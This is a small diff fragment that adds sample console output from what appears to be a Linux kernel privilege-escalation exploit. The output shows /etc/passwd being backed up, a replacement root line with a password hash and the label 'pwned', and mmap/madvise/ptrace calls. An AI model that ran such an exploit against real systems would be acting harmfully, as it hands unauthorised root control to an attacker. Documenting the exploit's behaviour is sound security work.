@@ -150,3 +150,11 @@ EOF
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password: pass
 
+Complete line:
+root:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+madvise 0
+
+ptrace 0
+
